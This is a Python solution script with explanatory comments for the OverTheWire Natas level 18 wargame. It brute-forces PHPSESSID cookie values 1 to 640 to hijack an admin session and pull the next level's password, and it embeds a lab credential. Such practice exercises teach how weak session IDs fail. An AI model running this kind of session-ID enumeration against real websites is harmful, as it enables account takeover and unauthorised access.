#!/bin/python3

import requests
import re
import html.parser

username = 'natas18'
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"#not 100% on this one
url = 'http://%s.natas.labs.overthewire.org?debug=true' % (username)
#data = {"username" : "randomstring54" , "password" : "test" , "submit" : "Login"}
session = requests.Session()
found = False

for i in range(1,641):
    ucookie = { "PHPSESSID" : str(i)}
    response = session.post(url + '',cookies = ucookie,auth = (username,password) )
    content = html.unescape(response.text)
    #print (content)
    print ("Attempting session ID = {}".format(i))
    if ("You are an admin") in content:
        found = True
        break 
    else:
        continue

if found:
    print ("The password is: {}".format(re.findall("Password: (.*)</pre",content)[0]))
else:
    print ("password not found please fix script")


#in this one the php code runs a number of functions all of which concerned with the $_session variable
#this variable cannot be changed by the user
#the only part we can edit is the PHPSESSID
#in a real website normally this would be fairly long hash and therefore it would be incredibly unlikely
#for two users to ever collide and it would be difficult for an attacker to guess another users PHPSESSID
#unfortunately this testing ground only uses 640 ID's

#so we need to have $_session['admin']==1 
#we can't change the value directly as it is held serverside and only connected to us through our PHPSESSID
#none of the functions in the php code allow us to set $_session['admin'] to 1

#therefore the only option we have left available to us is to run through each PHPSESSID in a loop until 
#we hit the ID that already has $_session['admin'] set to 1 serverside
#as there are only 640, it took longer to type this than to find the password

